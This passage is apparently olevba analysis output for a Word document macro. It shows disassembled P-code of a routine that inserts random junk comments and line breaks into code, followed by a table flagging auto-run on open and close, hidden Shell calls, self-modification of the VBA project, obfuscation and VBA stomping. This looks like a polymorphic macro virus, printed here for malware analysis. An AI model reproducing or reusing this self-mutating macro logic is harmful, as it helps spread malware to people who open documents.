' 	LineCont 0x0004 03 00 06 00
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #181:
' 	QuoteRem 0x000D 0x0009 " 7393.604"
' Line #182:
' 	LineCont 0x0004 01 00 0F 00
' 	EndIfBlock 
' Line #183:
' 	LineCont 0x0004 06 00 03 00
' 	Ld m 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #184:
' 	LineCont 0x0004 01 00 05 00
' 	EndIfBlock 
' Line #185:
' 	LineCont 0x0004 01 00 08 00
' 	EndWith 
' Line #186:
' 	QuoteRem 0x0008 0x0009 " 7011.365"
' Line #187:
' 	StartForVariable 
' 	Next 
' Line #188:
' 	QuoteRem 0x000D 0x0009 " 9866.989"
' Line #189:
' 	LineCont 0x0004 01 00 01 00
' 	EndIfBlock 
' Line #190:
' 	QuoteRem 0x0001 0x0009 " 2999.397"
' Line #191:
' Line #192:
' 	QuoteRem 0x0000 0x0009 " 9987.417"
' Line #193:
' 	LineCont 0x0004 01 00 05 00
' 	EndSub 
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x0009 " 8866.263"
' Line #196:
' Line #197:
' 	QuoteRem 0x0000 0x0009 " 3429.818"
' Line #198:
' 	LineCont 0x001C 01 00 10 00 02 00 0B 00 06 00 0D 00 07 00 04 00 0F 00 08 00 11 00 0F 00 14 00 0D 00
' 	FuncDefn (Private Function foo(ByRef s As String, ByRef i As Long, ByRef res As String, id_FFFE As Boolean) As Boolean)
' Line #199:
' Line #200:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #201:
' 	QuoteRem 0x000A 0x0009 " 486.5986"
' Line #202:
' 	QuoteRem 0x0000 0x0009 " 8586.589"
' Line #203:
' 	QuoteRem 0x0000 0x0009 " 5289.067"
' Line #204:
' 	LineCont 0x0008 01 00 0F 00 14 00 09 00
' 	Ld s 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld s 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #205:
' 	QuoteRem 0x0001 0x0009 " 7978.172"
' Line #206:
' 	QuoteRem 0x0000 0x0009 " 5299.711"
' Line #207:
' 	LineCont 0x0004 02 00 0C 00
' 	LitVarSpecial (False)
' 	St foo 
' Line #208:
' 	LineCont 0x0004 01 00 06 00
' 	ExitFunc 
' Line #209:
' 	QuoteRem 0x0006 0x0009 " 5787.237"
' Line #210:
' 	QuoteRem 0x0000 0x0009 " 1309.815"
' Line #211:
' 	LineCont 0x0004 01 00 02 00
' 	EndIfBlock 
' Line #212:
' 	QuoteRem 0x000D 0x0009 " 7038.897"
' Line #213:
' Line #214:
' 	LineCont 0x0010 05 00 0F 00 08 00 04 00 0D 00 07 00 0E 00 0E 00
' 	Ld s 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #215:
' 	LineCont 0x000C 03 00 08 00 08 00 06 00 0C 00 0F 00
' 	Ld res 
' 	Ld s 
' 	Ld s 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	St res 
' Line #216:
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0009 " 4972.939"
' Line #219:
' 	LineCont 0x0004 01 00 02 00
' 	LitVarSpecial (False)
' 	St foo 
' Line #220:
' 	QuoteRem 0x000C 0x0009 " 5219.488"
' Line #221:
' 	QuoteRem 0x0000 0x0009 " 8706.896"
' Line #222:
' 	QuoteRem 0x0000 0x0009 " 7890.977"
' Line #223:
' 	ExitFunc 
' Line #224:
' 	LineCont 0x0004 01 00 01 00
' 	EndIfBlock 
' Line #225:
' 	LineCont 0x0004 03 00 0B 00
' 	Ld res 
' 	Ld s 
' 	Concat 
' 	St tmp 
' Line #226:
' 	QuoteRem 0x0005 0x0009 " 8282.419"
' Line #227:
' 	LitStr 0x0000 ""
' 	St res 
' Line #228:
' 	QuoteRem 0x0001 0x0009 " 8164.352"
' Line #229:
' 	LineCont 0x0004 02 00 0C 00
' 	LitDI2 0x0001 
' 	St i 
' Line #230:
' 	QuoteRem 0x0005 0x0009 " 1841.801"
' Line #231:
' 	LineCont 0x0004 03 00 03 00
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	While 
' Line #232:
' 	QuoteRem 0x000D 0x0009 " 1240.063"
' Line #233:
' 	LineCont 0x000C 02 00 01 00 03 00 06 00 04 00 02 00
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FE9 
' 	Lt 
' 	IfBlock 
' Line #234:
' 	LineCont 0x0008 05 00 08 00 09 00 02 00
' 	Ld res 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x2710 
' 	Mul 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	St res 
' Line #235:
' Line #236:
' 	LineCont 0x0004 01 00 0D 00
' 	EndIfBlock 
' Line #237:
' 	QuoteRem 0x0008 0x0009 " 9004.449"
' Line #238:
' 	LineCont 0x0004 01 00 0A 00
' 	Ld res 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St res 
' Line #239:
' 	LineCont 0x0004 03 00 0E 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #240:
' Line #241:
' 	Wend 
' Line #242:
' 	QuoteRem 0x0005 0x0009 " 4882.628"
' Line #243:
' 	QuoteRem 0x0000 0x0009 " 7000.126"
' Line #244:
' 	LineCont 0x0010 01 00 03 00 03 00 0D 00 04 00 05 00 05 00 06 00
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld tmp 
' 	FnLen 
' 	For 
' Line #245:
' 	LineCont 0x000C 04 00 10 00 08 00 00 00 0A 00 0B 00
' 	Ld res 
' 	Ld tmp 
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St res 
' Line #246:
' 	LineCont 0x0014 01 00 0C 00 05 00 09 00 09 00 05 00 0A 00 0F 00 0E 00 08 00
' 	Ld tmp 
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #247:
' 	LineCont 0x0008 01 00 06 00 03 00 00 00
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #248:
' 	LineCont 0x0014 02 00 08 00 03 00 09 00 04 00 0C 00 05 00 10 00 0B 00 02 00
' 	Ld res 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Concat 
' 	St res 
' Line #249:
' 	LineCont 0x0008 01 00 00 00 04 00 00 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #250:
' 	QuoteRem 0x0002 0x0009 " 8806.321"
' Line #251:
' 	QuoteRem 0x0000 0x0009 " 9267.178"
' Line #252:
' 	LineCont 0x0004 01 00 01 00
' 	EndIfBlock 
' Line #253:
' 	QuoteRem 0x0001 0x0009 " 5320.891"
' Line #254:
' 	QuoteRem 0x0000 0x0009 " 8953.635"
' Line #255:
' Line #256:
' 	QuoteRem 0x0000 0x0009 " 7729.877"
' Line #257:
' 	EndIfBlock 
' Line #258:
' Line #259:
' 	QuoteRem 0x0000 0x0009 " 5157.937"
' Line #260:
' 	QuoteRem 0x0000 0x0009 " 1585.824"
' Line #261:
' 	StartForVariable 
' 	Next 
' Line #262:
' Line #263:
' 	LitVarSpecial (True)
' 	St foo 
' Line #264:
' 	LineCont 0x0004 01 00 09 00
' 	EndFunc 
' Line #265:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

